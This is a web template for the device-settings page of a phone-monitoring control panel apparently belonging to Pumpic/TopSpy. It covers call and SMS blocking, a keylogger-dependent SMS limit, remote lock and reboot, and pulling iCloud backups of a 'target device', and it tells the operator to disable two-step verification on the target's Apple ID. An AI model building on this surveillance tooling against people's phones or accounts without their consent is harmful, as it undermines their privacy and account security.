<style type='text/css' xmlns="http://www.w3.org/1999/html">
    #all, #textareaAlert {
        padding-left: 20px;
    }
    .modal-dialog {
        background-color: #ffffff;
        -webkit-border-radius: 4px;
        -moz-border-radius: 4px;
        border-radius: 4px;
    }
    .modal-header {
        border-bottom: 1px solid #e7e7e7;
    }
    .modal-dialog .text-content {
        padding: 20px;
    }
</style>
<div id="device-settings-page">
    <h1 class="text-center">{$title}</h1>
    <div class="container-max">
        <div class="row">
            {if !$supportMode && !$hasPackage}
            <div class="col-lg-12">
                <div class="alert alert-warning" role="alert">
                    <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">×</span><span class="sr-only">Close</span></button>
                    <p style="color:#303030;">No subscription is assigned to this device. <a href="{$di['router']->getRouteUrl('billing')}#active" style="color: #16a89e;font-weight: normal;">Manage subscriptions</a>.</p>
                </div>
            </div>
            {/if}
            
            <div class="col-lg-12">
                {insert "inc.cp.messages.htm"}
                <div id="backup-message" class="" style="display: none;border-radius:4px;">
                </div>
            </div>

            <div class="col-lg-6 col-md-6">
                {if $hasPackage && $data.isBlackListAvailable}
                <div class="panel panel-default">
                    <div class="panel-heading">{if $data.blockSMSActive}{$di.t->_('Call & SMS Blocking & Limiting')}{else}{$di.t->_('Call & Limiting')}{/if}<span class="asterisk asterisk-info">*</span></div>
                    <div class="panel-body text-center">
                        <label class="settings">{if $data.blockSMSActive}{$di.t->_('Call & SMS Blocking by Number')}{else}{$di.t->_('Call blocking by Number')}{/if}</label>
                        {if count($data.blackListPhones)}
                        <ul id="phone" class="list-group tags-holder">
                            {foreach $data.blackListPhones as $phone}
                            <li class="list-group-item tags-like">{$phone|e} <a href="{$di.router->getRouteUrl('settings')}?removePhonesBlackList={$phone|escape:'url'}" class="close disable-on-demo" aria-hidden="true" data-ajax="true" data-ajax-action="delete">&times;</a></li>
                            {/foreach}
                        </ul>
                        {/if}
                        <form role="form" action="" method="post">
                            <div class="row">
                                <div class="col-xs-9 col-sm-10 col-md-9">
                                    <input type="text" name="phone" class="form-control" placeholder="Phone Number" value="" data-value="" />
                                </div>
                                <div class="col-xs-3 col-sm-2 col-md-3">
                                    <button type="submit" class="btn btn-primary btn-stretch disable-on-demo" name="phonesBlackList" data-ajax="true" data-ajax-action="new" data-ajax-target="phone" data-ajax-delete="removePhonesBlackList">{$di.t->_('Add')}</button>
                                </div>
                            </div>
                        </form>
                    </div>
                    {if $hasPackage && ($data.blockSMSActive || $data.isOutgoingSmsLimitationsAvailable)}
                        {if $data.blockSMSActive}
                        <div class="panel-body text-center up-line">
                            <label class="settings">{$di.t->_('SMS Block List Words')}</label>
                            {if count($data.blackListWords)}
                            <ul id="badWord" class="list-group tags-holder">
                                {foreach $data.blackListWords as $word}
                                <li class="list-group-item tags-like">{$word|e} <a href="{$di.router->getRouteUrl('settings')}?removeWordsBlackList={$word|escape:'url'}" class="close disable-on-demo" aria-hidden="true" data-ajax="true" data-ajax-action="delete">&times;</a></li>
                                {/foreach}
                            </ul>
                            {/if}
                            <form role="form" action="" method="post">
                                <div class="row">
                                    <div class="col-xs-9 col-sm-10 col-md-9">
                                        <input type="text" name="badWord" value="" class="form-control" placeholder="Bad Word" />
                                    </div>
                                    <div class="col-xs-3 col-sm-2 col-md-3">
                                        <button type="submit" class="btn btn-primary btn-stretch disable-on-demo" name="wordsBlackList" data-ajax="true" data-ajax-action="new" data-ajax-target="badWord"  data-ajax-delete="removeWordsBlackList">{$di.t->_('Add')}</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                        {/if}
                        <div class="panel-body up-line">
                            <label class="settings">{$di.t->_('Outgoing SMS Limit per Day')}</label>
                            {if $data.isOutgoingSmsLimitationsAvailable}
                                {if !$data.isOutgoingSmsLimitationsActive}
                                <p class="help-block">
                                        <b>{$di.t->_('Outgoing SMS limiting requires activated Keylogger. You may %sactivate it now%s.', ['<a href="' ~ $di->getRouter()->getRouteUri('keylogger') ~ '?activate">', '</a>'])}</b>
                                    </p>
                                {else}
                                <form action="" method="post">
                                    <div class="checkbox">
                                            <label for="outgoingSmsLimitation">
                                                <input id="outgoingSmsLimitation" type="checkbox" data-target-disable="all" name="outgoingSmsLimitation"{if $data.settings.outgoing_sms_limitation} checked{/if} id="outgoingSmsLimitation" />{$di.t->_('Set SMS Limit')}
                                            </label>
                                        </div>
                                    <div class="form-group{if !$data.settings.outgoing_sms_limitation} hidden-block{/if}" id="all">
                                            <div style="width: 120px;">
                                                <input id="spinbox" {if !$data.settings.outgoing_sms_limitation} disabled="disabled"{/if} type="text" value="{$data.settings.outgoing_sms_limitation_count|e}" name="outgoingSmsLimitationCount" data-hide-me-all/>
                                            </div>
                                            <div class="checkbox">
                                                <label for="outgoingSmsLimitationAlert">
                                                    <input type="checkbox" {if !$data.settings.outgoing_sms_limitation} disabled="disabled"{/if} data-hide-me-all data-target-disable="textareaAlert" id="outgoingSmsLimitationAlert" name="outgoingSmsLimitationAlert"{if $data.settings.outgoing_sms_limitation_alert} checked{/if} id="outgoingSmsLimitationAlert" /> {$di.t->_('Show this alert to a user, when the limit is reached.')}
                                                </label>
                                            </div>
                                            <div id="textareaAlert">
                                            <textarea placeholder="Type your limitation message here" data-hide-me-textareaAlert {if !$data.settings.outgoing_sms_limitation_alert} disabled="disabled"{/if} name="outgoingSmsLimitationMessage" class="form-control {if !$data.settings.outgoing_sms_limitation_alert} hidden-form{/if}">{$data.settings.outgoing_sms_limitation_message|e}</textarea>
                                        </div>
                                    </div>
                                    {if $data.blockSMSActive || $data.isOutgoingSmsLimitationsActive}
                                        <button type="submit" name="smsSettings" class="btn btn-primary" style="float: right">{$di.t->_('Update Limit')}</button>
                                    {/if}
                                </form>
                                {/if}
                            {/if}
                        </div>
                    {/if}
                </div>
                {/if}
                {if $hasPackage && $currentDevice.os != 'icloud'}
                <div class="panel panel-default">
                    <div class="panel-heading">{$di.t->_('Device Operations')}<span class="asterisk asterisk-info">*</span></div>
                    {if $hasPackage && $data.lockActive}
                    <div class="panel-body">
                        <form role="form" action="" method="post">
                            <label for="password" class="settings">{$di.t->_('Lock Device with Password')}<span class="asterisk asterisk-info">*</span></label>
                            <div class="row form-group">
                                <div class="col-xs-8 col-sm-9 col-md-8">
                                    <input type="text" placeholder="{$di.t->_('4 digits only!')}" name="password" id="password" value="" class="form-control">
                                </div>
                                <div class="col-xs-4 col-sm-3 col-md-4">
                                    <button type="submit" name="lockDevice" class="btn btn-primary btn-block">{$di.t->_('Lock')}</button>
                                </div>
                            </div>
                            <div class="form-group">
                                {if $di.currentDevice.os == 'ios'}<p class="text-info">{$di.t->_('This is a one-time password used for additional authentication. If you already have a password set on the phone, the new one-time password will be written over it. To unblock the phone, enter the new password (the "wrong password" alert will pop up) and then enter the original password.')}</p>{/if}
                            </div>
                        </form>
                    </div>
                    {/if}
                    {if $hasPackage && ($data.rebootApplicationActive || $data.rebootDeviceActive)}
                    <div class="panel-body up-line" style="padding: 1.7em 0; text-align: center">
                        {if $data.rebootDeviceActive}<button type="submit" id="rebootDevice" class="btn btn-danger">{$di.t->_('Reboot Device')}</button>{/if}
                        {if $data.rebootApplicationActive}<button type="submit" id="rebootApp" class="btn btn-danger">{$di.t->_('Reboot Application')}</button>{/if}
                    </div>
                    {/if}
                    <div class="panel-body up-line">
                        <form role="form" action="" method="post">
                            {if  $hasPackage && $data.isSimNotificationAvailable}
                            <div class="checkbox">
                                <label style="padding-left: 0; display: block;">
                                    <span class="col-xs-6" style="padding: 0;"><strong>{$di.t->_('SIM Card Change Notifications via Email')}</strong></span>
                                    <div class="col-xs-6" style="text-align: right; padding: 0;"><input id="switch-state" type="checkbox" data-ajax="true" data-ajax-action="email" data-on-color="retroorange" name="simNotifications"{if $data.settings.sim_notification} checked{/if} /></div>
                                </label>
                            </div>
                            {/if}
                        </form>
                    </div>
                </div>
                {/if}
                <div class="panel panel-default">
                    <div class="panel-heading">
                        {if !empty($currentDevice.name)}
                        {$di['t']->_('Unassign %s', [$currentDevice.name|e])}
                        {else}
                        {$di['t']->_('Unassign Device')}
                        {/if}
                    </div>
                    <div class="panel-body text-center">
                        <p class="text-danger">{$di.t->_('This action cannot be undone. Your subscription will be deactivated, and you will not be able to use it with any other device any longer. All the data will be deleted from your Control Panel immediately.')}</p>
                        <a id="unassign-btn" class="btn btn-danger" href="{$di['router']->getRouteUrl('settings')}?delete">{$di.t->_('Unassign Device')}</a>
                    </div>
                </div>
            </div>
            <div class="col-lg-6 col-md-6">
                <div class="panel panel-default">
                    <div class="panel-heading">{$di.t->_('Device Info')}</div>
                    <div class="panel-body">
                        <label class="settings">{$di.t->_('Device Name')}</label>
                        <form role="form" action="" method="post">
                            <div class="row">
                                <div class="form-group col-xs-7 col-sm-10 col-md-8">
                                    <input type="text" name="name" value="{$di.currentDevice.name|e}" class="form-control">
                                </div>
                                <div class="form-group col-xs-5 col-sm-2 col-md-4">
                                    <button id="update-btn" type="submit" class="btn btn-primary btn-block" name="deviceSettings">{$di.t->_('Update')}</button>
                                </div>
                            </div>
                        </form>
                    </div>
                    {if $hasPackage}
                        <div class="panel-body inline-data-noicon">
                            <div class="title">{$di.t->_('Device Status')}</div>
                            <div class="data">
                                {if $di.currentDevice.os == 'icloud'}
                                    <span>
                                    {if isset($iCloudRecord) && $iCloudRecord->getId()}
                                    {if $iCloudRecord->getProcessing()}
                                    {$di.t->_('Awaiting New Data Upload')}
                                    {elseif $iCloudRecord->getLastError() == 1 || $iCloudRecord->getLastError() == 6}
                                        {$di.t->_('Authentication error / failed. Please, %svalidate iCloud account in our system%s.', ['<a href="' ~ $di->getRouter()->getRouteUri("profileICloudPasswordReset", ['deviceId' => $di['devId']]) ~ '">', '</a>'])}
                                    {elseif $iCloudRecord->getLastError() == 10}
                                        {$di.t->_('Authentication error. Please, unblock the target Apple ID and %svalidate iCloud account in our system%s.', ['<a href="' ~ $di->getRouter()->getRouteUri("profileICloudPasswordReset", ['deviceId' => $di['devId']]) ~ '">', '</a>'])}    
                                    {elseif $iCloudRecord->getLastError() == 6}
                                        {$di.t->_('This Apple ID is protected with a two-step verification. Please turn it off and try again. Follow the link to learn more: %s', ['<a href="https://support.apple.com/en-us/HT202664">https://support.apple.com/en-us/HT202664</a>'])}
                                    {elseif $iCloudRecord->getLastError() && $iCloudRecord->getLastError() < 100}
                                        {$di.t->_('New Data Upload Error. Please contact Customer %sSupport%s', ['<a href="mailto:support@pumpic.com">', '</a>'])}
                                    {else}
                                        {$di.t->_('Awaiting iCloud Backup')}
                                    {/if}
                                    {/if}
                                    </span>
                                {else}
                                    {if $di.currentDevice.online}
                                        {if $di.currentDevice.network == 'wifi'}
                                            <div class="network-status wifi">
                                                <div class="icon"></div>
                                                <div class="name">WiFi</div>
                                            </div>
                                        {else}
                                            <div class="network-status mobile">
                                                <div class="icon"></div>
                                                <div class="name">Mobile Network</div>
                                            </div>
                                        {/if}
                                    {else}
                                        <div class="network-status offline">
                                            <div class="icon"></div>
                                            <div class="name">Offline</div>
                                        </div>
                                    {/if}
                                {/if}
                            </div>
                        </div>
                        {if $di.currentDevice.os == 'icloud'}
                        <div class="panel-body inline-data-noicon text-center">
                            <a href="#" id="modal-link" class="btn btn-primary{if $di.currentDevice.processing == 1} disabled{/if}" data-toggle="modal" data-target="#confirm-backup-modal">Download Latest Backup</a>
                            <p style="font-size: 12px;margin-top: 5px;">Check if there is а new backup for the device</p>
                            {if $di.currentDevice.processing == 1}<p class="text-info" style="padding-top: 10px;">Downloading backup data now. It will be available shortly!</p>
                            {elseif $di.currentDevice.processing == 2}<p class="text-info" style="padding-top: 10px;">No backups found on the device. Please, back up the target device manually.</p>{/if}
                        </div>
                        {/if}
                    {/if}
                    <div id="progress-bar-block" style="padding: 0 10px; display: none;">
                        <div class="progress">
                            <div id="backup-progress" class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%;"></div>
                        </div>
                    </div>
                    {if $hasPackage && $currentDevice.os != 'icloud'}
                    <div class="panel-body inline-data-noicon">
                        <div class="title">
                            {$di.t->_('Device Model')}
                        </div>
                        <div class="data">
                            <span>{$di.currentDevice.model|e}</span>
                        </div>
                    </div>
                    <div class="panel-body inline-data-noicon">
                        <div class="title">
                            {$di.t->_('Operating System')}
                        </div>
                        <div class="data">
                            <i class="device-status-s online {$di.currentDevice.os}"></i>
                            <span>{if $currentDevice.os == 'ios'}iOS{elseif $currentDevice.os == 'android'}Android{/if} {$osVersion} {if $di.currentDevice.os == 'ios'}<div class="label label-warning">jailbreak</div>{/if}</span>
                        </div>
                    </div>
                    {/if}
                </div>
                {if $hasPackage && $currentDevice.os != 'icloud'}
                <div class="panel panel-default">
                    <div class="panel-heading">{$di.t->_('Device Details')}</div>
                    <div class="panel-body inline-data">
                        <div class="icon"><span class="icon-power"></span></div>
                        <div class="title">{$di.t->_('Power')}</div>
                        <div class="data">{$currentDevice.power}%</div>
                    </div>
                    <div class="panel-body inline-data">
                        <div class="icon"><span class="icon-is"></span></div>
                        <div class="title">{$di.t->_('Internal Storage')}</div>
                        <div class="data">
                            {if $data.info.internalStorage}
                            {$data.info.internalStorage.free} <span>/</span> {$data.info.internalStorage.total}
                            {else}
                            <span style="color: #d2d2d2">N/A</span>
                            {/if}
                        </div>
                    </div>
                    <div class="panel-body inline-data">
                        <div class="icon"><span class="icon-es"></span></div>
                        <div class="title">{$di.t->_('External Storage')}</div>
                        <div class="data">
                            {if $data.info.externalStorage}
                            {$data.info.externalStorage.free} <span>/</span> {$data.info.externalStorage.total}
                            {else}
                            <span style="color: #d2d2d2">N/A</span>
                            {/if}
                        </div>
                    </div>
                    <div class="panel-body inline-data">
                        <div class="icon"><span class="icon-bandwidth"></span></div>
                        <div class="title">{$di.t->_('Monitoring Speed')}</div>
                        <div class="data">
                            {if $data.info.bandwidth}
                            {$data.info.bandwidth} kbps
                            {else}
                            <span style="color: #d2d2d2">N/A</span>
                            {/if}
                        </div>
                    </div>
                    <div class="panel-body inline-data">
                        <div class="icon"><span class="icon-ram"></span></div>
                        <div class="title">{$di.t->_('RAM Free')}</div>
                        <div class="data">
                            {if $data.info.ram_free}
                            {$data.info.ram_free} MB
                            {else}
                            <span style="color: #d2d2d2">N/A</span>
                            {/if}
                        </div>
                    </div>
                    {if $data.info.sim_id !== null}
                    <div class="panel-body inline-data">
                        <div class="icon"><span class="icon-carrier"></span></div>
                        <div class="title">{$di.t->_('Carrier')}</div>
                        <div class="data">
                            {if $data.info.sim_id == ''}
                                <span style="color: #d2d2d2">No Sim</span>
                            {else}
                                {if $data.info.carrier}
                                {$data.info.carrier}
                                {else}
                                <span style="color: #d2d2d2">N/A</span>
                                {/if}
                            {/if}
                        </div>
                    </div>
                    {/if}
                </div>
                {/if}
                {if $hasPackage && $currentDevice.os != 'icloud'}
                <div class="panel panel-default">
                    <div class="panel-heading">{$di.t->_('Monitoring Details')}</div>
                    <div class="panel-body inline-data-noicon">
                        <div class="title">{$di.t->_('First Visit')}</div>
                        <div class="data" id="first-visit-value" data-time="{$currentDevice.created}">N/A</div>
                    </div>
                    <div class="panel-body inline-data-noicon">
                        <div class="title">{$di.t->_('Last Visit')}</div>
                        <div class="data" id="last-visit-value" data-time="{$currentDevice.last_visit}">N/A</div>
                    </div>
                    <div class="panel-body inline-data-noicon">
                        <div class="title">{$di.t->_('Application Version')}</div>
                        <div class="data">
                            {if $appLastVersion > $currentDevice.app_version}
                            <span class="outdate" data-toggle="tooltip" data-placement="top" data-original-title="
                        {$di.t->_('The new version of the app is available already. To improve the accuracy of the app operation and use all provided features to the fullest we recommend updating Pumpic on the target device.')}
                        {if $currentDevice.os == 'ios'}
                        {$di.t->_('The app will be updated automatically within one hour. Please ensure accurate Wi-Fi connection.')}
                        {elseif $currentDevice.os == 'android'}
                        {if $currentDevice.rooted == 1}
                        {$di.t->_('The app will be updated automatically within one hour. Please ensure accurate Wi-Fi connection. Also, make sure that Pumpic is provided the Super User rights. You can update the app manually as well. To do so, run Pumpic on the target device, enter the master password, and tap “Update App”.')}
                        {else}
                        {$di.t->_('Please update the app manually. To do so, run Pumpic on the target device, enter the master password, and tap “Update App”.')}
                        {/if}
                        {/if}


                        ">!</span>
                            {/if}
                            {if $currentDevice.os == 'android' }
                                {if $currentDevice.app_second_version}
                                    {$currentDevice.app_second_version}
                                {elseif $currentDevice.app_version == 23}
                                    20
                                {else}
                                {$currentDevice.app_version}
                                {/if}
                            {else}
                             {$currentDevice.app_version}
                            {/if}

                        </div>
                    </div>
                </div>
                {/if}
                {*
                <div class="panel panel-default">
                    <div class="panel-body text-center">
                        <h4>{$di.t->_('This device is on %1$s plan!', ['<span class="text-primary">' ~ $data.plan ~ '</span>'])}</h4>
                        <a href="http://www.topspyapp.com/pricing-and-plans/?dev_id={$di.devId}" class="btn btn-warning">{$di.t->_('Upgrade')}</a>
                    </div>
                </div>
                <div class="panel panel-default">
                    <div class="panel-body text-center">
                        <div class="settings-box">
                            <h5>{$di.t->_('New version of the app is available!')}</h5>
                            <p>{$di.t->_('The TopSpy version you have installed is outdated. To update it, physical access to the target device is required.')}</p>
                            <p style="font-size: 14px;">
                                {$di.t->_('Click "Update device" and within 5 minutes you will see the confirmation pop-up on the target device screen.')}
                                {$di.t->_('Click "Update" and the app will start updating automatically.')}
                            </p>
                            <center><input type="button" id="update_button" value="{$di.t->_('Update device')}"></center>
                        </div>
                    </div>
                </div>
                *}
            </div>
        </div>
    </div>
    {if $hasPackage && $data.isDeviceCommandsAvailable}
        <p class="text-info"><span class="asterisk asterisk-info">*</span> {$di.t->_('Command activation will take up to 20 min. In case the target device has any additional software to track Calls or SMS, blocking may work improperly.')}</p>
    {/if}
</div>
<div class="modal fade bs-example-modal-md text-center" id="confirm-backup-modal" tabindex="-1" role="dialog" aria-labelledby="modal-label">
    <div class="modal-dialog modal-md" role="document">
        <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">×</span></button>
            <h4 class="modal-title" data-dismiss="modal" >Downloading Backup Data</h4>
        </div>
        <div class="text-content">
            <p>You are about to check iCloud backup server for the latest data. If it is available, it will be downloaded and displayed in the Control Panel within 1 hour.</p>
            <div class="button-group">
                <a href="#" id="load-backup" class="btn btn-primary" data-dismiss="modal" >Check now</a>
                <a href="#" class="btn btn-danger" data-dismiss="modal" aria-label="Close">Cancel</a>
            </div>
        </div>
    </div>
</div>
<script>
    $(function() {
        var bar = $('#backup-progress');
        function enableProgressBar(progress, interval, data) {
            var width = Math.round(bar.width() / bar.parent().width() * 100);
            $('#backup-message').hide();
            $('#unassign-btn').addClass('disabled');
            $('#update-btn').addClass('disabled');
            $('#modal-link').addClass('disabled');
            bar.attr('aria-valuenow', width).css('width', width+'%');
            var intervalID = setInterval(frame, interval);
            bar.data('clock', intervalID);
            function frame() {
                if (width >= progress) {
                    clearInterval(intervalID);
                    if (width >= 100) {
                        clearInterval(intervalID)
                        bar.attr('aria-valuenow', 0).css('width', 0+'%');
                        return progressSuccess(data);
                    }
                } else {
                    width += 5;
                    bar.attr('aria-valuenow', width).css('width', width+'%');
                }
            }
        };

        function progressSuccess(data) {
            var statusBlock = $('#backup-message');
            statusBlock.html('<div class="alert"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button><i class="fa fa-info-circle"></i><span></span></div>');
            var progressBarBlock = $('#progress-bar-block');
            statusBlock.addClass('alert-'+data['status'])
                    .find('span').html(data['message']);
            statusBlock.show();
            progressBarBlock.hide();
            console.log(data)
            $('#unassign-btn').removeClass('disabled');
            $('#update-btn').removeClass('disabled');
            if(data.leaveDisabled !== 'true') {
            $('#modal-link').removeClass('disabled');
            }
        };
        $('#confirm-backup-modal').on('hidden.bs.modal', function () {
            $('#modal-link').one('focus', function (e){
                $(this).blur();
            });
        });
        $('#load-backup').click(function (e) {
            e.preventDefault();
            $.ajax({
                url: '?check-new-backup',
                contentType: 'application/json; charset=utf-8',
                dataType: 'json',
                beforeSend: function () {
                    $('#progress-bar-block').show();
                    enableProgressBar(70, 300)
                },
                success: function (data) {
                    console.log('AJAX_SUCCESS');
                    var existingTimer = bar.data('clock');
                    if (existingTimer){
                        clearInterval(existingTimer);
                    }
                    enableProgressBar(100, 200, data)
                },
                error: function (data) {
                    var errorMsg = {
                        status: 'danger',
                        message: 'Oops, something went wrong with your request. Check your Internet connection or try again later. If the problem recurs, please contact Customer <a href="mailto:support@pumpic.com">Support</a>. Error code: ' + data.status
                    }
                    console.log('AJAX_ERROR', data, data.status);
                    var existingTimer = bar.data('clock');
                    if (existingTimer){
                        clearInterval(existingTimer);
                    }
                    progressSuccess(errorMsg)
                }
            });
        })
    });
</script>
<script>
    
    var $phone = $("input[name='phone']");
    var $min_mask = 3, $max_mask = 21;
    var $symbols_after_mask = '', $symbols_before_mask = '~', $def_mask = '';

    for(var i = 1; i < $max_mask; i ++) {
        $def_mask += '9';
    } 

    function clearMask() {
        $phone.off(".mask").removeData('mask_phone');
    }
    
    function setMask() {

        $.mask.definitions['~'] = "[(+)|(0-9)]";    
        $phone.mask($symbols_before_mask+$def_mask+$symbols_after_mask, {
            autoclear: false,
            dataName: 'mask_phone',
            placeholder:"",
            completed: false,
            clearOnLostFocus: false,
            clearIfNotMatch: false
        });
        
        $phone.on('click.mask', function() { 
            if($(this).data('value').length > 0) {
                $(this).attr( 'data-value', $(this).data('value').replace(/\ /g, '') );
            }
        });
        
        $phone.on('blur.mask', function() { 
            var _input = $(this).mask();
            if(_input.length > 0)
                $("input[name='phone']").attr('data-value', (_input+$symbols_after_mask).replace(/\ /g, ''));
        });
        
        $phone.on('keypress.mask', function() {
            var _input = $(this).mask();
            if(_input.length > 0)
                $("input[name='phone']").attr('data-value', _input+$symbols_after_mask);
        });

//        $phone.on('focus.mask', function() {
//            $(this).val('');
//        });
    
    }
    setMask();
    
    $(document).ready(function () {
        
        
        
        if ($('#first-visit-value').data('time') > 0) {
            $('#first-visit-value').html(moment.unix($('#first-visit-value').data('time')).format("LLL"));
        }
        
        if ($('#last-visit-value').data('time') > 0) {
            $('#last-visit-value').html(moment.unix($('#last-visit-value').data('time')).format("LLL"));
        }

        $("body").tooltip({ selector: '[data-toggle=tooltip]' });

        $('#rebootDevice').click(function () {
            if (confirm("{$di.t->_('Reboot Device?')}")) {
                window.location = "{$di.router->getRouteUrl('settings')}?rebootDevice";
            }
        });

        $('#rebootApp').click(function () {
            if (confirm("{$di.t->_('Reboot Application?')}")) {
                window.location = "{$di.router->getRouteUrl('settings')}?rebootApp";
            }
        });

        $("#password").mask("9999");
        
        $("#spinbox").TouchSpin({
            min: 1,
            max: 100,
            step: 1,
            boostat: 2,
            maxboostedstep: 5
        });

        function ajaxAction($el) {
            var AjaxActions = {
                delete: function() {
                    var $holder = $el.parent();
                    $.get(
                            $el.attr('href'),
                            function(response){
                                if(response.status != 200) {
                                    alert(response.message);
                                    return;
                                }

                                if($holder.parent().find('li').length == 1) {
                                    $holder.parent().remove();
                                }
                                else {
                                    $holder.remove();
                                }
                            },
                            "json"
                    );
                },
                email: function() {
                    $.post(
                            window.location.href,
                            {
                                simNotifications: $el.is(":checked")
                            },
                            function(response) {
                                if(response.status != 200) {
                                    alert(response.message);
                                    return;
                                }
                            },
                            "json");
                },
                new: function() {
                    var target = $el.data('ajax-target'),
                            del = $el.data('ajax-delete'),
                            $data = $('[name="'+target+'"]');
                            // val = $data.val().trim().replace(',','');    
                            
                    if(target == "phone") {
                       var val = $data.attr('data-value').trim().replace(',',''); 
                    } else 
                       var val = $data.val().trim().replace(',',''); 
                   
                    var ajaxData = {};
                    ajaxData[$el.attr('name')] = '';
                    ajaxData[target] = val;

                    $.post(
                            window.location.href,
                            ajaxData,
                            function(response) {
                                if(response.status != 201) {
                                    alert(response.message);
                                    return;
                                }

                                var item = '<li class="list-group-item tags-like">' + _.escape(val) + ' <a href="{$di.router->getRouteUrl('settings')}?' + del + '=' + encodeURIComponent(val) + '" class="close disable-on-demo" aria-hidden="true" data-ajax="true" data-ajax-action="delete">&times;</a></li>'

                                var $container = $('#' + target);

                                if(!$container.length) {
                                    $el.parent().parent().before('<ul id="'+target+'" class="list-group tags-holder"></ul>')
                                    $container = $('#' + target);
                                }

                                $container.append(item);

                                updateCallbacks();

                                $data.val('');
                            },
                            "json");
                }
            };

            if(action = $el.data('ajax-action')) {
                if(action in AjaxActions) {
                    AjaxActions[action]();
                }
            }
        }

        function updateCallbacks() {
            var $ajaxElems = $('[data-ajax="true"]');

            $ajaxElems.unbind();

            $ajaxElems.click(function(e){
                // validate mask
                var inputPhone = $phone.attr('data-value');
                if(inputPhone.length > 0) {
                    if(inputPhone.length <= $min_mask) { 
                        alert('Failed to add number. There must be more than 3 digits.')
                        return false;
                    } 
                }
                
                
                ajaxAction($(this));
         
                clearMask();
                setMask();
                
                e.preventDefault();
            }).on('switchChange.bootstrapSwitch', function(){
                ajaxAction($(this));
            });
        }

        updateCallbacks();

        /*
         * Disable targets
         */
        $('[data-target-disable]').click(function(){
            var target = $(this).data('target-disable');
            console.log($(this).is(':checked'));
            if(!$(this).is(':checked')) {
                $('#' + target + ' [data-hide-me-'+target+']').addClass('hidden-form').prop('disabled', 'disabled');
                if(target == 'all' && $('[data-target-disable="textareaAlert"]').is(':checked')) {
                    $('#all textarea').prop('disabled', 'disabled');
                }
            }
            else {
                $('#' + target + ' [data-hide-me-'+target+']').removeClass('hidden-form').prop('disabled', false);
                if(target == 'all' && $('[data-target-disable="textareaAlert"]').is(':checked')) {
                    $('#all textarea').prop('disabled', false);
                }
            }
            // console.log(target);
        });

        $('#switch-state').bootstrapSwitch();

        /*      
         $('#update_button').click(function() {
         var button = this;
         if (confirm("Really update?")) {
         $.post(window.location.toString(), {
         must_update: 1
         }, function() {
         $(button).closest('.settings-box').hide();
         });
         }
         });
         */
    });
</script>